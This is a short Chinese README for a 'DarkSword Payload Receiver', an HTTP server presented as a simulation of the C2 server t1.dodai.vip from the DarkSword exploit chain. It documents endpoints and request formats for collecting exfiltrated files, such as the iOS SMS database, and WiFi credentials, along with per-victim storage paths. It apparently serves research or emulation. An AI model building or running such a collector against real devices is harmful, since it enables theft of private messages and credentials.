# DarkSword Payload Receiver

HTTP 数据接收端，模拟 DarkSword 漏洞链的 C2 服务器 `t1.dodai.vip`。

## 运行

```bash
bun run src/index.ts
```

## 环境变量

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `PORT` | `8882` | 监听端口 |
| `DATA_DIR` | `./data` | 数据存储目录 |

## 端点

| 端点 | 说明 |
|------|------|
| `POST /stats` | 接收文件类 payload（照片、数据库、文档等） |
| `POST /upload` | 接收 WiFi 凭证 |

## 数据存储结构

```
data/
└── {client_ip}/
    ├── stats/
    │   ├── {category}.jsonl        # 每种类别的元数据日志
    │   └── {category}/             # 按类别分目录存储原始文件
    │       └── {timestamp}__{filename}
    └── upload/
        └── wifi.jsonl              # WiFi 凭证日志
```

> IP 地址中的 `:` 会被替换为 `_`（如 `192.168.1.100` 或 `::1` → `__1`）

## /stats 请求格式

```http
POST /stats HTTP/1.1
Host: localhost:8882
Content-Type: application/json
X-Device-UUID: {device_id}
Content-Length: ...

{
  "category": "sms",
  "path": "/private/var/mobile/Library/SMS/sms.db",
  "description": "SMS database",
  "data": "{base64编码的文件内容}"
}
```

## /upload 请求格式

```http
POST /upload HTTP/1.1
Host: localhost:8882
Content-Type: application/json
Content-Length: ...

{
  "hostname": "RouterName",
  "password": "wifi_password"
}
```
